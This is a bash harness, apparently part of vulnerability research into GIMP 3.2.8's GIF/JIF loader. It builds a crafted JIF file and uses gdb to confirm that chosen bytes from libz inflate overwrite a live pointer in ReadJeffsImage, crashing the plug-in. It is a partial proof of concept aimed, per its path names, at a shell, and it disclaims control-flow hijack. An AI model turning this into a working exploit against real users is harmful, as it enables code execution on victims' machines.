#!/usr/bin/env bash
# W313: no-shim follow-up to W312 in the real GIMP 3.2.8 file-gif-load plug-in.
# Observe the chosen-byte stores into the live object after `indexes`, then
# install a READ watchpoint on the overwritten pointer word after inflate()
# returns and record the fault address at SIGSEGV.
#
# Asserted: wrapped inflate, live pointer before the write, chosen 0x4d stores
# from real libz, post-inflate read watcher installed, safe control clean.
# NOT asserted: any read hit, chosen-address write, dereference, named object,
# control flow, marker or command. Grade remains rung 3 / rung 4 PARTIAL.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage}"
IMG="$WORK/GIMP-3.2.8-x86_64.AppImage"
ROOT="$WORK/squashfs-root"
EVID="$HERE/evidence"
PASS=0
FAIL=0

ok () { echo "PASS: $1"; PASS=$((PASS + 1)); }
no () { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

mkdir -p "$WORK" "$EVID"
if [ ! -f "$IMG" ] || [ ! -f "$WORK/SHA256SUMS" ]; then
  echo "provision the SHA256-verified GIMP 3.2.8 AppImage first (see run-appimage-span.sh)" >&2
  exit 1
fi
(cd "$WORK" && grep 'GIMP-3.2.8-x86_64.AppImage' SHA256SUMS | sha256sum -c -)
ok "official AppImage SHA256 verified"

if [ ! -x "$ROOT/AppRun" ]; then
  chmod +x "$IMG"
  (cd "$WORK" && ./GIMP-3.2.8-x86_64.AppImage --appimage-extract >/dev/null)
fi
"$ROOT/AppRun" --version | grep -q '3.2.8'
ok "extracted runtime reports GIMP 3.2.8"

# Regenerate a no-shim AppRun every replay: earlier probes may have left an
# LD_PRELOAD export in the extracted AppRun.
target="$ROOT/AppRun.readptr"
: > "$target"
while IFS= read -r line || [ -n "$line" ]; do
  case "$line" in
    *gimpjif2shell/live/*shim.so*) continue ;;
  esac
  printf '%s\n' "$line" >> "$target"
done < "$ROOT/AppRun"
chmod +x "$target"
! grep -q 'gimpjif2shell/live/.*shim.so' "$target"
ok "no-shim AppRun variant generated"

python3 "$BASE/realglib/make-jif.py" "$EVID/gdb-liveptr-8192.jif" published-run 8192 4d > /dev/null
ok "8 KiB chosen-run JIF written"

run_case () {
  local file="$1" out="$2"
  local home; home="$(mktemp -d /tmp/gimpjif-readptrhome-XXXXXX)"
  (cd "$ROOT" && exec setsid timeout -k 5 90 env HOME="$home" \
      GIMP_PLUGIN_DEBUG_WRAP=file-gif-load,run \
      GIMP_PLUGIN_DEBUG_WRAPPER="gdb -q -batch -x $HERE/gdb-readptr.cmd --args" \
      ./AppRun.readptr -i --batch-interpreter plug-in-script-fu-eval \
      -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$file\" \"$(basename "$file")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
      -b '(gimp-quit 0)') > "$out" 2>&1 &
  local runpid=$!
  wait "$runpid" || true
  # Children outlive the main AppRun; kill only this run's session.
  kill -9 -- "-$runpid" 2>/dev/null || true
}

SAFE="$BASE/realglib/evidence/safe.jif"
run_case "$SAFE" "$EVID/gdb-readptr-safe.log"
run_case "$EVID/gdb-liveptr-8192.jif" "$EVID/gdb-readptr-8192.log"

grep -q 'batch command executed successfully' "$EVID/gdb-readptr-safe.log" \
  && ok "safe 4x4 JIF loads under the read-watch debugger" || no "safe read-watch control"
! grep -q 'W313 READ HIT' "$EVID/gdb-readptr-safe.log" \
  && ok "safe JIF raises no post-inflate read hit" || no "safe read hit"

grep -q 'W313 PRE-INFLATE indexes=' "$EVID/gdb-readptr-8192.log" \
  && ok "wrapped inflate reached in the live plug-in" || no "wrapped inflate call"
grep -qE 'W313 LIVE FIELDS flags=0x1 ptr=0x0000' "$EVID/gdb-readptr-8192.log" \
  && ok "live object pointer present before the write" || no "live pointer field"
grep -q 'W313 WATCH SET liveptr' "$EVID/gdb-readptr-8192.log" \
  && ok "write watch set on live pointer word" || no "liveptr write watch"
grep -q 'W313 WATCH HIT liveptr.*value=0x4d4d4d4d4d4d4d4d' "$EVID/gdb-readptr-8192.log" \
  && ok "chosen 0x4d bytes fully replace the live pointer word" || no "chosen pointer value"
grep -q 'W313 INFLATE RETURNED' "$EVID/gdb-readptr-8192.log" \
  && ok "inflate return reached in the live plug-in" || no "inflate return breakpoint"
grep -q 'W313 READ SET liveptr' "$EVID/gdb-readptr-8192.log" \
  && ok "post-inflate read watcher installed" || no "read watcher install"
grep -q 'libz.so.1' "$EVID/gdb-readptr-8192.log" \
  && ok "store comes from the real libz" || no "real libz frame"
grep -q ' in ReadJeffsImage ' "$EVID/gdb-readptr-8192.log" \
  && ok "store backtrace reaches ReadJeffsImage" || no "ReadJeffsImage frame"
grep -q 'is_jeff_image=1' "$EVID/gdb-readptr-8192.log" \
  && ok "JIF branch is on the live backtrace" || no "JIF branch frame"
grep -qE 'W313 PLUGIN SIGNAL (SIGSEGV|SIGABRT|SIGBUS)' "$EVID/gdb-readptr-8192.log" \
  && ok "plug-in faults after the chosen-byte stores" || no "live fault"

echo "OBSERVATION read hits: $(grep -c 'W313 READ HIT' "$EVID/gdb-readptr-8192.log" || true)"
grep 'W313 FAULT SI_ADDR' "$EVID/gdb-readptr-8192.log" || true

echo "CEILING: a read hit is a candidate consumer, not by itself a dereference or named object; no chosen address, marker, command or r5 claim."
echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
